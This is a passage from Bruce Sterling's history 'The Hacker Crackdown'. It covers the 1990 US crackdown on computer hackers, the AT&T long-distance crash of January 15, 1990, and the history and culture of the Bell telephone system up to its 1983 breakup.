imperfect by their nature, and there are human beings in cyberspace.  The way we live in cyberspace is a funhouse mirror of the way we live in the real world.  We take both our advantages and our troubles with us.    This book is about trouble in cyberspace.  Specifically, this book is about certain strange events in the year 1990, an unprecedented and startling year for the the growing world of computerized communications.    In 1990 there came a nationwide crackdown on illicit computer hackers, with arrests, criminal charges, one dramatic show trial, several guilty pleas, and huge confiscations of data and equipment all over the USA.    The Hacker Crackdown of 1990 was larger, better organized, more deliberate, and more resolute than any previous effort in the brave new world of computer crime.  The U.S. Secret Service, private telephone security, and state and local law enforcement groups across the country all joined forces in a determined attempt to break the back of America's electronic underground.  It was a fascinating effort, with very mixed results.    The Hacker Crackdown had another unprecedented effect  it spurred the creation, within  the computer community,  of the Electronic Frontier Foundation, a new and very odd interest group, fiercely dedicated to the establishment and preservation of electronic civil liberties.  The crackdown, remarkable in itself, has created a melee of debate over electronic crime, punishment, freedom of the press, and issues of search and seizure.  Politics has entered cyberspace.  Where people go, politics follow.    This is the story of the people of cyberspace.      PART ONE   Crashing the System     On January 15, 1990, AT T's long distance telephone switching system crashed.    This was a strange, dire, huge event.  Sixty thousand people lost their telephone service completely.  During the nine long hours of frantic effort that it took to restore service, some seventy million telephone calls went uncompleted.     Losses of service, known as  outages  in the telco trade, are a known and accepted hazard of the telephone business. Hurricanes hit, and phone cables get snapped by the thousands. Earthquakes wrench through buried fiber optic lines.  Switching stations catch fire and burn to the ground.  These things do happen.  There are contingency plans for them, and decades of experience in dealing with them.  But the Crash of January 15 was unprecedented.  It was unbelievably huge, and it occurred for no apparent physical reason.    The crash started on a Monday afternoon in a single switching station in Manhattan.  But, unlike any merely physical damage, it spread and spread.  Station after station across America collapsed in a chain reaction, until fully half of AT T's network had gone haywire and the remaining half was hard put to handle the overflow.    Within nine hours, AT T software engineers more or less understood what had caused the crash.  Replicating the problem exactly, poring over software line by line, took them a couple of weeks.  But because it was hard to understand technically, the full truth of the matter and its implications were not widely and thoroughly aired and explained.  The root cause of the crash remained obscure, surrounded by rumor and fear.    The crash was a grave corporate embarrassment.  The  culprit  was a bug in AT T's own software  not the sort of admission the telecommunications giant wanted to make, especially in the face of increasing competition.  Still, the truth WAS told, in the baffling technical terms necessary to explain it.    Somehow the explanation failed to persuade American law enforcement officials and even telephone corporate security personnel.  These people were not technical experts or software wizards, and they had their own suspicions about the cause of this disaster.    The police and telco security had important sources of information denied to mere software engineers.  They had informants in the computer underground and years of experience in dealing with high tech rascality that seemed to grow ever more sophisticated.  For years they had been expecting a direct and savage attack against the American national telephone system. And with the Crash of January 15  the first month of a new, high  tech decade  their predictions, fears, and suspicions seemed at last to have entered the real world.  A world where the telephone system had not merely crashed, but, quite likely, BEEN crashed  by  hackers.     The crash created a large dark cloud of suspicion that would color certain people's assumptions and actions for months. The fact that it took place in the realm of software was suspicious on its face.  The fact that it occurred on Martin Luther King Day, still the most politically touchy of American holidays, made it more suspicious yet.    The Crash of January 15 gave the Hacker Crackdown its sense of edge and its sweaty urgency.  It made people, powerful people in positions of public authority, willing to believe the worst.  And, most fatally, it helped to give investigators a willingness to take extreme measures and the determination to preserve almost total secrecy.    An obscure software fault in an aging switching system in New York was to lead to a chain reaction of legal and constitutional trouble all across the country.    Like the crash in the telephone system, this chain reaction was ready and waiting to happen.  During the 1980s, the American legal system was extensively patched to deal with the novel issues of computer crime.  There was, for instance, the Electronic Communications Privacy Act of 1986  eloquently described as  a stinking mess  by a prominent law enforcement official .  And there was the draconian Computer Fraud and Abuse Act of 1986, passed unanimously by the United States Senate, which later would reveal a large number of flaws.  Extensive, well meant efforts had been made to keep the legal system up to date.  But in the day to day grind of the real world, even the most elegant software tends to crumble and suddenly reveal its hidden bugs.    Like the advancing telephone system, the American legal system was certainly not ruined by its temporary crash  but for those caught under the weight of the collapsing system, life became a series of blackouts and anomalies.    In order to understand why these weird events occurred, both in the world of technology and in the world of law, it's not enough to understand the merely technical problems.  We will get to those  but first and foremost, we must try to understand the telephone, and the business of telephones, and the community of human beings that telephones have created.    Technologies have life cycles, like cities do, like institutions do, like laws and governments do.    The first stage of any technology is the Question Mark, often known as the  Golden Vaporware  stage.  At this early point, the technology is only a phantom, a mere gleam in the inventor's eye.  One such inventor was a speech teacher and electrical tinkerer named Alexander Graham Bell.    Bell's early inventions, while ingenious, failed to move the world.  In 1863, the teenage Bell and his brother Melville made an artificial talking mechanism out of wood, rubber, gutta  percha, and tin.  This weird device had a rubber covered  tongue  made of movable wooden segments, with vibrating rubber  vocal cords,  and rubber  lips  and  cheeks.   While Melville puffed a bellows into a tin tube, imitating the lungs, young Alec Bell would manipulate the  lips,   teeth,  and  tongue,  causing the thing to emit high pitched falsetto gibberish.    Another would be technical breakthrough was the Bell  phonautograph  of 1874, actually made out of a human cadaver's ear.  Clamped into place on a tripod, this grisly gadget drew sound wave images on smoked glass through a thin straw glued to its vibrating earbones.    By 1875, Bell had learned to produce audible sounds  ugly shrieks and squawks  by using magnets, diaphragms, and electrical current.    Most  Golden Vaporware  technologies go nowhere.    But the second stage of technology is the Rising Star, or, the  Goofy Prototype,  stage.  The telephone, Bell's most ambitious gadget yet, reached this stage on March 10, 1876.  On that great day, Alexander Graham Bell became the first person to transmit intelligible human speech electrically.  As it happened, young Professor Bell, industriously tinkering in his Boston lab, had spattered his trousers with acid.  His assistant, Mr. Watson, heard his cry for help  over Bell's experimental audio telegraph. This was an event without precedent.    Technologies in their  Goofy Prototype  stage rarely work very well.  They're experimental, and therefore half baked and rather frazzled.  The prototype may be attractive and novel, and it does look as if it ought to be good for something or other. But nobody, including the inventor, is quite sure what. Inventors, and speculators, and pundits may have very firm ideas about its potential use, but those ideas are often very wrong.    The natural habitat of the Goofy Prototype is in trade shows and in the popular press.  Infant technologies need publicity and investment money like a tottering calf need milk. This was very true of Bell's machine.  To raise research and development money, Bell toured with his device as a stage attraction.    Contemporary press reports of the stage debut of the telephone showed pleased astonishment mixed with considerable dread.  Bell's stage telephone was a large wooden box with a crude speaker nozzle, the whole contraption about the size and shape of an overgrown Brownie camera.  Its buzzing steel soundplate, pumped up by powerful electromagnets, was loud enough to fill an auditorium.  Bell's assistant Mr. Watson, who could manage on the keyboards fairly well, kicked in by playing the organ from distant rooms, and, later, distant cities.  This feat was considered marvellous, but very eerie indeed.    Bell's original notion for the telephone, an idea promoted for a couple of years, was that it would become a mass medium.  We might recognize Bell's idea today as something close to modern  cable radio.   Telephones at a central source would transmit music, Sunday sermons, and important public speeches to a paying network of wired up subscribers.    At the time, most people thought this notion made good sense.  In fact, Bell's idea was workable.  In Hungary, this philosophy of the telephone was successfully put into everyday practice.  In Budapest, for decades, from 1893 until after World War I, there was a government run information service called  Telefon Hirmondo .   Hirmondo  was a centralized source of news and entertainment and culture, including stock reports, plays, concerts, and novels read aloud.  At certain hours of the day, the phone would ring, you would plug in a loudspeaker for the use of the family, and Telefon Hirmondo  would be on the air  or rather, on the phone.    Hirmondo  is dead tech today, but Hirmondo  might be considered a spiritual ancestor of the modern telephone accessed computer data services, such as CompuServe, GEnie or Prodigy. The principle behind Hirmondo  is also not too far from computer  bulletin board systems  or BBS's, which arrived in the late 1970s, spread rapidly across America, and will figure largely in this book.    We are used to using telephones for individual person to  person speech, because we are used to the Bell system.  But this was just one possibility among many.  Communication networks are very flexible and protean, especially when their hardware becomes sufficiently advanced.  They can be put to all kinds of uses. And they have been  and they will be.    Bell's telephone was bound for glory, but this was a combination of political decisions, canny infighting in court, inspired industrial leadership, receptive local conditions and outright good luck.  Much the same is true of communications systems today.    As Bell and his backers struggled to install their newfangled system in the real world of nineteenth century New England, they had to fight against skepticism and industrial rivalry.  There was already a strong electrical communications network present in America  the telegraph.  The head of the Western Union telegraph system dismissed Bell's prototype as  an electrical toy  and refused to buy the rights to Bell's patent. The telephone, it seemed, might be all right as a parlor entertainment  but not for serious business.    Telegrams, unlike mere telephones, left a permanent physical record of their messages.  Telegrams, unlike telephones, could be answered whenever the recipient had time and convenience.  And the telegram had a much longer distance range than Bell's early telephone.  These factors made telegraphy seem a much more sound and businesslike technology  at least to some.    The telegraph system was huge, and well entrenched.  In 1876, the United States had 214,000 miles of telegraph wire, and 8500 telegraph offices.  There were specialized telegraphs for businesses and stock traders, government, police and fire departments.  And Bell's  toy  was best known as a stage magic musical device.    The third stage of technology is known as the  Cash Cow  stage.  In the  cash cow  stage, a technology finds its place in the world, and matures, and becomes settled and productive. After a year or so, Alexander Graham Bell and his capitalist backers concluded that eerie music piped from nineteenth century cyberspace was not the real selling point of his invention. Instead, the telephone was about speech  individual, personal speech, the human voice, human conversation and human interaction.  The telephone was not to be managed from any centralized broadcast center.  It was to be a personal, intimate technology.    When you picked up a telephone, you were not absorbing the cold output of a machine  you were speaking to another human being.  Once people realized this, their instinctive dread of the telephone as an eerie, unnatural device, swiftly vanished.  A  telephone call  was not a  call  from a  telephone  itself, but a call from another human being, someone you would generally know and recognize.  The real point was not what the machine could do for you  or to you , but what you yourself, a person and citizen, could do THROUGH the machine.  This decision on the part of the young Bell Company was absolutely vital.    The first telephone networks went up around Boston   mostly among the technically curious and the well to do  much the same segment of the American populace that, a hundred years later, would be buying personal computers .  Entrenched backers of the telegraph continued to scoff.    But in January 1878, a disaster made the telephone famous.  A train crashed in Tarriffville, Connecticut.  Forward  looking doctors in the nearby city of Hartford had had Bell's  speaking telephone  installed.  An alert local druggist was able to telephone an entire community of local doctors, who rushed to the site to give aid.  The disaster, as disasters do, aroused intense press coverage.  The phone had proven its usefulness in the real world.    After Tarriffville, the telephone network spread like crabgrass.  By 1890 it was all over New England.  By '93, out to Chicago.  By '97, into Minnesota, Nebraska and Texas.  By 1904 it was all over the continent.    The telephone had become a mature technology.  Professor Bell  now generally known as  Dr. Bell  despite his lack of a formal degree  became quite wealthy.  He lost interest in the tedious day to day business muddle of the booming telephone network, and gratefully returned his attention to creatively hacking around in his various laboratories, which were now much larger, better ventilated, and gratifyingly better equipped. Bell was never to have another great inventive success, though his speculations and prototypes anticipated fiber optic transmission, manned flight, sonar, hydrofoil ships, tetrahedral construction, and Montessori education.  The  decibel,  the standard scientific measure of sound intensity, was named after Bell.    Not all Bell's vaporware notions were inspired.  He was fascinated by human eugenics.  He also spent many years developing a weird personal system of astrophysics in which gravity did not exist.    Bell was a definite eccentric.  He was something of a hypochondriac, and throughout his life he habitually stayed up until four A.M., refusing to rise before noon.  But Bell had accomplished a great feat  he was an idol of millions and his influence, wealth, and great personal charm, combined with his eccentricity, made him something of a loose cannon on deck.  Bell maintained a thriving scientific salon in his winter mansion in Washington, D.C., which gave him considerable backstage influence in governmental and scientific circles.  He was a major financial backer of the the magazines SCIENCE and NATIONAL GEOGRAPHIC, both still flourishing today as important organs of the American scientific establishment.     Bell's companion Thomas Watson, similarly wealthy and similarly odd, became the ardent political disciple of a 19th  century science fiction writer and would be social reformer, Edward Bellamy.  Watson also trod the boards briefly as a Shakespearian actor.    There would never be another Alexander Graham Bell, but in years to come there would be surprising numbers of people like him.  Bell was a prototype of the high tech entrepreneur.  High  tech entrepreneurs will play a very prominent role in this book  not merely as technicians and businessmen, but as pioneers of the technical frontier, who can carry the power and prestige they derive from high technology into the political and social arena.    Like later entrepreneurs, Bell was fierce in defense of his own technological territory.  As the telephone began to flourish, Bell was soon involved in violent lawsuits in the defense of his patents.  Bell's Boston lawyers were excellent, however, and Bell himself, as an elocution teacher and gifted public speaker, was a devastatingly effective legal witness.  In the eighteen years of Bell's patents, the Bell company was involved in six hundred separate lawsuits.  The legal records printed filled 149 volumes.  The Bell Company won every single suit.    After Bell's exclusive patents expired, rival telephone companies sprang up all over America.  Bell's company, American Bell Telephone, was soon in deep trouble.  In 1907, American Bell Telephone fell into the hands of the rather sinister J.P. Morgan financial cartel, robber baron speculators who dominated Wall Street.    At this point, history might have taken a different turn. American might well have been served forever by a patchwork of locally owned telephone companies.  Many state politicians and local businessmen considered this an excellent solution.    But the new Bell holding company, American Telephone and Telegraph or AT T, put in a new man at the helm, a visionary industrialist named Theodore Vail.  Vail, a former Post Office manager, understood large organizations and had an innate feeling for the nature of large scale communications.  Vail quickly saw to it that AT T seized the technological edge once again.  The Pupin and Campbell  loading coil,  and the deForest  audion,  are both extinct technology today, but in 1913 they gave Vail's company the best LONG DISTANCE lines ever built.  By controlling long distance  the links between, and over, and above the smaller local phone companies  AT T swiftly gained the whip hand over them, and was soon devouring them right and left.     Vail plowed the profits back into research and development, starting the Bell tradition of huge scale and brilliant industrial research.    Technically and financially, AT T gradually steamrollered the opposition.  Independent telephone companies never became entirely extinct, and hundreds of them flourish today.  But Vail's AT T became the supreme communications company.  At one point, Vail's AT T bought Western Union itself, the very company that had derided Bell's telephone as a  toy.   Vail thoroughly reformed Western Union's hidebound business along his modern principles  but when the federal government grew anxious at this centralization of power, Vail politely gave Western Union back.    This centralizing process was not unique.  Very similar events had happened in American steel, oil, and railroads.  But AT T, unlike the other companies, was to remain supreme.  The monopoly robber barons of those other industries were humbled and shattered by government trust busting.    Vail, the former Post Office official, was quite willing to accommodate the US government  in fact he would forge an active alliance with it.  AT T would become almost a wing of the American government, almost another Post Office  though not quite.  AT T would willingly submit to federal regulation, but in return, it would use the government's regulators as its own police, who would keep out competitors and assure the Bell system's profits and preeminence.     This was the second birth  the political birth  of the American telephone system.  Vail's arrangement was to persist, with vast success, for many decades, until 1982.  His system was an odd kind of American industrial socialism.  It was born at about the same time as Leninist Communism, and it lasted almost as long  and, it must be admitted, to considerably better effect.    Vail's system worked.  Except perhaps for aerospace, there has been no technology more thoroughly dominated by Americans than the telephone.  The telephone was seen from the beginning as a quintessentially American technology.  Bell's policy, and the policy of Theodore Vail, was a profoundly democratic policy of UNIVERSAL ACCESS.  Vail's famous corporate slogan,  One Policy, One System, Universal Service,  was a political slogan, with a very American ring to it.    The American telephone was not to become the specialized tool of government or business, but a general public utility.  At first, it was true, only the wealthy could afford private telephones, and Bell's company pursued the business markets primarily.  The American phone system was a capitalist effort, meant to make money  it was not a charity.  But from the first, almost all communities with telephone service had public telephones.  And many stores  especially drugstores  offered public use of their phones.  You might not own a telephone  but you could always get into the system, if you really needed to.    There was nothing inevitable about this decision to make telephones  public  and  universal.   Vail's system involved a profound act of trust in the public.  This decision was a political one, informed by the basic values of the American republic.  The situation might have been very different  and in other countries, under other systems, it certainly was.    Joseph Stalin, for instance, vetoed plans for a Soviet phone system soon after the Bolshevik revolution.  Stalin was certain that publicly accessible telephones would become instruments of anti Soviet counterrevolution and conspiracy.   He was probably right.   When telephones did arrive in the Soviet Union, they would be instruments of Party authority, and always heavily tapped.   Alexander Solzhenitsyn's prison camp novel THE FIRST CIRCLE describes efforts to develop a phone system more suited to Stalinist purposes.     France, with its tradition of rational centralized government, had fought bitterly even against the electric telegraph, which seemed to the French entirely too anarchical and frivolous.  For decades, nineteenth century France communicated via the  visual telegraph,  a nation spanning, government owned semaphore system of huge stone towers that signalled from hilltops, across vast distances, with big windmill like arms.  In 1846, one Dr. Barbay, a semaphore enthusiast, memorably uttered an early version of what might be called  the security expert's argument  against the open media.       No, the electric telegraph is not a sound invention.  It will always be at the mercy of the slightest disruption, wild youths, drunkards, bums, etc....  The electric telegraph meets those destructive elements with only a few meters of wire over which supervision is impossible.  A single man could, without being seen, cut the telegraph wires leading to Paris, and in twenty four hours cut in ten different places the wires of the same line, without being arrested.  The visual telegraph, on the contrary, has its towers, its high walls, its gates well guarded from inside by strong armed men.  Yes, I declare, substitution of the electric telegraph for the visual one is a dreadful measure, a truly idiotic act.       Dr. Barbay and his high security stone machines were eventually unsuccessful, but his argument  that communication exists for the safety and convenience of the state, and must be carefully protected from the wild boys and the gutter rabble who might want to crash the system  would be heard again and again.    When the French telephone system finally did arrive, its snarled inadequacy was to be notorious.  Devotees of the American Bell System often recommended a trip to France, for skeptics.    In Edwardian Britain, issues of class and privacy were a ball and chain for telephonic progress.  It was considered outrageous that anyone  any wild fool off the street  could simply barge bellowing into one's office or home, preceded only by the ringing of a telephone bell.  In Britain, phones were tolerated for the use of business, but private phones tended be stuffed away into closets, smoking rooms, or servants' quarters. Telephone operators were resented in Britain because they did not seem to  know their place.   And no one of breeding would print a telephone number on a business card  this seemed a crass attempt to make the acquaintance of strangers.    But phone access in America was to become a popular right  something like universal suffrage, only more so.  American women could not yet vote when the phone system came through  yet from the beginning American women doted on the telephone.  This  feminization  of the American telephone was often commented on by foreigners.  Phones in America were not censored or stiff or formalized  they were social, private, intimate, and domestic. In America, Mother's Day is by far the busiest day of the year for the phone network.    The early telephone companies, and especially AT T, were among the foremost employers of American women.  They employed the daughters of the American middle class in great armies  in 1891, eight thousand women  by 1946, almost a quarter of a million.  Women seemed to enjoy telephone work  it was respectable, it was steady, it paid fairly well as women's work went, and  not least  it seemed a genuine contribution to the social good of the community.  Women found Vail's ideal of public service attractive.  This was especially true in rural areas, where women operators, running extensive rural party  lines, enjoyed considerable social power.  The operator knew everyone on the party line, and everyone knew her.    Although Bell himself was an ardent suffragist, the telephone company did not employ women for the sake of advancing female liberation.  AT T did this for sound commercial reasons. The first telephone operators of the Bell system were not women, but teenage American boys.  They were telegraphic messenger boys  a group about to be rendered technically obsolescent , who swept up around the phone office, dunned customers for bills, and made phone connections on the switchboard, all on the cheap.    Within the very first year of operation, 1878, Bell's company learned a sharp lesson about combining teenage boys and telephone switchboards.  Putting teenage boys in charge of the phone system brought swift and consistent disaster.  Bell's chief engineer described them as  Wild Indians.   The boys were openly rude to customers.  They talked back to subscribers, saucing off, uttering facetious remarks, and generally giving lip.  The rascals took Saint Patrick's Day off without permission.  And worst of all they played clever tricks with the switchboard plugs   disconnecting calls, crossing lines so that customers found themselves talking to strangers, and so forth.    This combination of power, technical mastery, and effective anonymity seemed to act like catnip on teenage boys.    This wild kid on the wires phenomenon was not confined to the USA  from the beginning, the same was true of the British phone system.  An early British commentator kindly remarked    No doubt boys in their teens found the work not a little irksome, and it is also highly probable that under the early conditions of employment the adventurous and inquisitive spirits of which the average healthy boy of that age is possessed, were not always conducive to the best attention being given to the wants of the telephone subscribers.     So the boys were flung off the system  or at least, deprived of control of the switchboard.  But the  adventurous and inquisitive spirits  of the teenage boys would be heard from in the world of telephony, again and again.    The fourth stage in the technological life cycle is death    the Dog,  dead tech.  The telephone has so far avoided this fate.  On the contrary, it is thriving, still spreading, still evolving, and at increasing speed.     The telephone has achieved a rare and exalted state for a technological artifact   it has become a HOUSEHOLD OBJECT.  The telephone, like the clock, like pen and paper, like kitchen utensils and running water, has become a technology that is visible only by its absence.  The telephone is technologically transparent.  The global telephone system is the largest and most complex machine in the world, yet it is easy to use.  More remarkable yet, the telephone is almost entirely physically safe for the user.     For the average citizen in the 1870s, the telephone was weirder, more shocking, more  high tech  and harder to comprehend, than the most outrageous stunts of advanced computing for us Americans in the 1990s.  In trying to understand what is happening to us today, with our bulletin board systems, direct overseas dialling, fiber optic transmissions, computer viruses, hacking stunts, and a vivid tangle of new laws and new crimes, it is important to realize that our society has been through a similar challenge before  and that, all in all, we did rather well by it.    Bell's stage telephone seemed bizarre at first.  But the sensations of weirdness vanished quickly, once people began to hear the familiar voices of relatives and friends, in their own homes on their own telephones.  The telephone changed from a fearsome high tech totem to an everyday pillar of human community.    This has also happened, and is still happening, to computer networks.  Computer networks such as NSFnet, BITnet, USENET, JANET, are technically advanced, intimidating, and much harder to use than telephones.  Even the popular, commercial computer networks, such as GEnie, Prodigy, and CompuServe, cause much head scratching and have been described as  user hateful.  Nevertheless they too are changing from fancy high tech items into everyday sources of human community.    The words  community  and  communication  have the same root.  Wherever you put a communications network, you put a community as well.  And whenever you TAKE AWAY that network   confiscate it, outlaw it, crash it, raise its price beyond affordability  then you hurt that community.    Communities will fight to defend themselves.  People will fight harder and more bitterly to defend their communities, than they will fight to defend their own individual selves.  And this is very true of the  electronic community  that arose around computer networks in the 1980s  or rather, the VARIOUS electronic communities, in telephony, law enforcement, computing, and the digital underground that, by the year 1990, were raiding, rallying, arresting, suing, jailing, fining and issuing angry manifestos.    None of the events of 1990 were entirely new.  Nothing happened in 1990 that did not have some kind of earlier and more understandable precedent.  What gave the Hacker Crackdown its new sense of gravity and importance was the feeling  the COMMUNITY feeling  that the political stakes had been raised  that trouble in cyberspace was no longer mere mischief or inconclusive skirmishing, but a genuine fight over genuine issues, a fight for community survival and the shape of the future.    These electronic communities, having flourished throughout the 1980s, were becoming aware of themselves, and increasingly, becoming aware of other, rival communities. Worries were sprouting up right and left, with complaints, rumors, uneasy speculations.  But it would take a catalyst, a shock, to make the new world evident.  Like Bell's great publicity break, the Tarriffville Rail Disaster of January 1878, it would take a cause celebre.    That cause was the AT T Crash of January 15, 1990.  After the Crash, the wounded and anxious telephone community would come out fighting hard.       The community of telephone technicians, engineers, operators and researchers is the oldest community in cyberspace. These are the veterans, the most developed group, the richest, the most respectable, in most ways the most powerful.  Whole generations have come and gone since Alexander Graham Bell's day, but the community he founded survives  people work for the phone system today whose great grandparents worked for the phone system.  Its specialty magazines, such as TELEPHONY, AT T TECHNICAL JOURNAL, and TELEPHONE ENGINEER AND MANAGEMENT, are decades old  they make computer publications like MACWORLD and PC WEEK look like amateur johnny come latelies.    And the phone companies take no back seat in high  technology, either.  Other companies' industrial researchers may have won new markets  but the researchers of Bell Labs have won SEVEN NOBLE PRIZES.  One potent device that Bell Labs originated, the transistor, has created entire GROUPS of industries.  Bell Labs are world famous for generating  a patent a day,  and have even made vital discoveries in astronomy, physics and cosmology.    Throughout its seventy year history,  Ma Bell  was not so much a company as a way of life.  Until the cataclysmic divestiture of the 1980s, Ma Bell was perhaps the ultimate maternalist mega employer.  The AT T corporate image was the  gentle giant,   the voice with a smile,  a vaguely socialist  realist world of cleanshaven linemen in shiny helmets and blandly pretty phone girls in headsets and nylons.  Bell System employees were famous as rock ribbed Kiwanis and Rotary members, Little  League enthusiasts, school board people.    During the long heyday of Ma Bell, the Bell employee corps were nurtured top to bottom on a corporate ethos of public service.  There was good money in Bell, but Bell was not ABOUT money  Bell used public relations, but never mere marketeering. People went into the Bell System for a good life, and they had a good life.  But it was not mere money that led Bell people out in the midst of storms and earthquakes to fight with toppled phone  poles, to wade in flooded manholes, to pull the red eyed graveyard shift over collapsing switching systems.  The Bell ethic was the electrical equivalent of the postman's  neither rain, nor snow, nor gloom of night would stop these couriers.    It is easy to be cynical about this, as it is easy to be cynical about any political or social system  but cynicism does not change the fact that thousands of people took these ideals very seriously.  And some still do.    The Bell ethos was about public service  and that was gratifying  but it was also about private POWER, and that was gratifying too.  As a corporation, Bell was very special.  Bell was privileged.  Bell had snuggled up close to the state.  In fact, Bell was as close to government as you could get in America and still make a whole lot of legitimate money.    But unlike other companies, Bell was above and beyond the vulgar commercial fray.  Through its regional operating companies, Bell was omnipresent, local, and intimate, all over America  but the central ivory towers at its corporate heart were the tallest and the ivoriest around.    There were other phone companies in America, to be sure  the so called independents.  Rural cooperatives, mostly  small fry, mostly tolerated, sometimes warred upon.  For many decades,  independent  American phone companies lived in fear and loathing of the official Bell monopoly  or the  Bell Octopus,  as Ma Bell's nineteenth century enemies described her in many angry newspaper manifestos .  Some few of these independent entrepreneurs, while legally in the wrong, fought so bitterly against the Octopus that their illegal phone networks were cast into the street by Bell agents and publicly burned.    The pure technical sweetness of the Bell System gave its operators, inventors and engineers a deeply satisfying sense of power and mastery.  They had devoted their lives to improving this vast nation spanning machine  over years, whole human lives, they had watched it improve and grow.  It was like a great technological temple.  They were an elite, and they knew it   even if others did not  in fact, they felt even more powerful BECAUSE others did not understand.    The deep attraction of this sensation of elite technical power should never be underestimated.   Technical power  is not for everybody  for many people it simply has no charm at all. But for some people, it becomes the core of their lives.  For a few, it is overwhelming, obsessive  it becomes something close to an addiction.  People  especially clever teenage boys whose lives are otherwise mostly powerless and put upon  love this sensation of secret power, and are willing to do all sorts of amazing things to achieve it.  The technical POWER of electronics has motivated many strange acts detailed in this book, which would otherwise be inexplicable.    So Bell had power beyond mere capitalism.  The Bell service ethos worked, and was often propagandized, in a rather saccharine fashion.  Over the decades, people slowly grew tired of this.  And then, openly impatient with it.  By the early 1980s, Ma Bell was to find herself with scarcely a real friend in the world.  Vail's industrial socialism had become hopelessly out of fashion politically.  Bell would be punished for that. And that punishment would fall harshly upon the people of the telephone community.       In 1983, Ma Bell was dismantled by federal court action. The pieces of Bell are now separate corporate entities.  The core of the company became AT T Communications, and also AT T Industries  formerly Western Electric, Bell's manufacturing arm . AT T Bell Labs become Bell Communications Research, Bellcore. Then there are the Regional Bell Operating Companies, or RBOCs, pronounced  arbocks.     Bell was a titan and even these regional chunks are gigantic enterprises   Fortune 50 companies with plenty of wealth and power behind them.  But the clean lines of  One Policy, One System, Universal Service  have been shattered, apparently forever.    The  One Policy  of the early Reagan Administration was to shatter a system that smacked of noncompetitive socialism. Since that time, there has been no real telephone  policy  on the federal level.  Despite the breakup, the remnants of Bell have never been set free to compete in the open marketplace.    The RBOCs are still very heavily regulated, but not from the top.  Instead, they struggle politically, economically and legally, in what seems an endless turmoil, in a patchwork of overlapping federal and state jurisdictions.  Increasingly, like other major American corporations, the RBOCs are becoming multinational, acquiring important commercial interests in Europe, Latin America, and the Pacific Rim.  But this, too, adds to their legal and political predicament.    The people of what used to be Ma Bell are not happy about their fate.  They feel ill used.  They might have been grudgingly willing to make a full transition to the free market  to become just companies amid other companies.  But this never happened. Instead, AT T and the RBOCS   the Baby Bells   feel themselves wrenched from side to side by state regulators, by Congress, by the FCC, and especially by the federal court of Judge Harold Greene, the magistrate who ordered the Bell breakup and who has been the de facto czar of American telecommunications ever since 1983.  Bell people feel that they exist in a kind of paralegal limbo today.  They don't understand what's demanded of them.  If it's  service,  why aren't they treated like a public service  And if it's money, then why aren't they free to compete for it  No one seems to know, really.  Those who claim to know keep changing their minds.  Nobody in authority seems willing to grasp the nettle for once and all.    Telephone people from other countries are amazed by the American telephone system today.  Not that it works so well  for nowadays even the French telephone system works, more or less. They are amazed that the American telephone system STILL works AT ALL, under these strange conditions.    Bell's  One System  of long distance service is now only about eighty percent of a system, with the remainder held by Sprint, MCI, and the midget long distance companies.  Ugly wars over dubious corporate practices such as  slamming   an underhanded method of snitching clients from rivals  break out with some regularity in the realm of long distance service.  The battle to break Bell's long distance monopoly was long and ugly, and since the breakup the battlefield has not become much prettier.  AT T's famous shame and blame advertisements, which emphasized the shoddy work and purported ethical shadiness of their competitors, were much remarked on for their studied psychological cruelty.    There is much bad blood in this industry, and much long  treasured resentment.  AT T's post breakup corporate logo, a striped sphere, is known in the industry as the  Death Star   a reference from the movie STAR WARS, in which the  Death Star  was the spherical high tech fortress of the harsh breathing imperial ultra baddie, Darth Vader.   Even AT T employees are less than thrilled by the Death Star.  A popular  though banned  T shirt among AT T employees bears the old fashioned Bell logo of the Bell System, plus the newfangled striped sphere, with the before  and after comments    This is your brain  This is your brain on drugs!   AT T made a very well financed and determined effort to break into the personal computer market  it was disastrous, and telco computer experts are derisively known by their competitors as  the pole climbers.   AT T and the Baby Bell arbocks still seem to have few friends.    Under conditions of sharp commercial competition, a crash like that of January 15, 1990 was a major embarrassment to AT T. It was a direct blow against their much treasured reputation for reliability.  Within days of the crash AT T's Chief Executive Officer, Bob Allen, officially apologized, in terms of deeply pained humility        AT T had a major service disruption last Monday.  We didn't live up to our own standards of quality, and we didn't live up to yours. It's as simple as that.  And that's not acceptable to us.  Or to you.... We understand how much people have come to depend upon AT T service, so our AT T Bell Laboratories scientists and our network engineers are doing everything possible to guard against a recurrence.... We know there's no way to make up for the inconvenience this problem may have caused you.       Mr Allen's  open letter to customers  was printed in lavish ads all over the country   in the WALL STREET JOURNAL, USA TODAY, NEW YORK TIMES, LOS ANGELES TIMES, CHICAGO TRIBUNE, PHILADELPHIA INQUIRER, SAN FRANCISCO CHRONICLE EXAMINER, BOSTON GLOBE, DALLAS MORNING NEWS, DETROIT FREE PRESS, WASHINGTON POST, HOUSTON CHRONICLE, CLEVELAND PLAIN DEALER, ATLANTA JOURNAL CONSTITUTION, MINNEAPOLIS STAR TRIBUNE, ST. PAUL PIONEER PRESS DISPATCH, SEATTLE TIME POST INTELLIGENCER, TACOMA NEWS TRIBUNE, MIAMI HERALD, PITTSBURGH PRESS, ST. LOUIS POST DISPATCH, DENVER POST, PHOENIX REPUBLIC GAZETTE and TAMPA TRIBUNE.    In another press release, AT T went to some pains to suggest that this  software glitch  MIGHT have happened just as easily to MCI, although, in fact, it hadn't.   MCI's switching software was quite different from AT T's  though not necessarily any safer.   AT T also announced their plans to offer a rebate of service on Valentine's Day to make up for the loss during the Crash.       Every technical resource available, including Bell Labs scientists and engineers, has been devoted to assuring it will not occur again,  the public was told.  They were further assured that  The chances of a recurrence are small  a problem of this magnitude never occurred before.       In the meantime, however, police and corporate security maintained their own suspicions about  the chances of recurrence  and the real reason why a  problem of this magnitude  had appeared, seemingly out of nowhere.  Police and security knew for a fact that hackers of unprecedented sophistication were illegally entering, and reprogramming, certain digital switching stations.  Rumors of hidden  viruses  and secret  logic bombs  in the switches ran rampant in the underground, with much chortling over AT T's predicament, and idle speculation over what unsung hacker genius was responsible for it.  Some hackers, including police informants, were trying hard to finger one another as the true culprits of the Crash.    Telco people found little comfort in objectivity when they contemplated these possibilities.  It was just too close to the bone for them  it was embarrassing  it hurt so much, it was hard even to talk about.    There has always been thieving and misbehavior in the phone system.  There has always been trouble with the rival independents, and in the local loops.  But to have such trouble in the core of the system, the long distance switching stations, is a horrifying affair.  To telco people, this is all the difference between finding roaches in your kitchen and big horrid sewer rats in your bedroom.    From the outside, to the average citizen, the telcos still seem gigantic and impersonal.  The American public seems to regard them as something akin to Soviet apparats.  Even when the telcos do their best corporate citizen routine, subsidizing magnet high schools and sponsoring news shows on public television, they seem to win little except public suspicion.    But from the inside, all this looks very different. There's harsh competition.  A legal and political system that seems baffled and bored, 